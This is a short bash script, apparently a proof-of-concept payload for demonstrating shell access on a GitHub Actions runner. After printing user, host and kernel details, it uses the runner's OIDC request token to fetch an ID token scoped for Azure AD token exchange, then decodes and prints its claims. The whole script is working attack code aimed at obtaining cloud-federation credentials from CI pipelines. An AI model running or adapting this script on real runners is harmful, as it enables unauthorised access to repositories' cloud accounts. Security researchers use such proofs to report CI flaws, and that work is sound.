#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF $(date -u) ==="
id; whoami; hostname; uname -a; echo "cwd=$(pwd)"
if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  echo "OIDC_LEN=${#OIDC}"
  printf '%s' "$OIDC" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);c=json.loads(base64.urlsafe_b64decode(s));print({k:c.get(k) for k in ("iss","aud","sub","repository","event_name","ref","workflow")})' || true
fi
echo "=== PROOF END ==="
